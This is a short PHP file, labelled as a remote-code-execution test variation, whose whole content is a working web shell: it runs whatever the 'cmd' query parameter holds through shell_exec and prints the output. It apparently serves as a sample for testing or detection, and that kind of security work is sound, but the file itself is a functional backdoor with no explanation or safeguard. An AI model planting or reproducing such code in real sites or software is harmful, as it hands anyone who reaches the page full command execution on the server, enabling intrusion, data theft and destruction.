<?php
// RCE test variation #1180
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>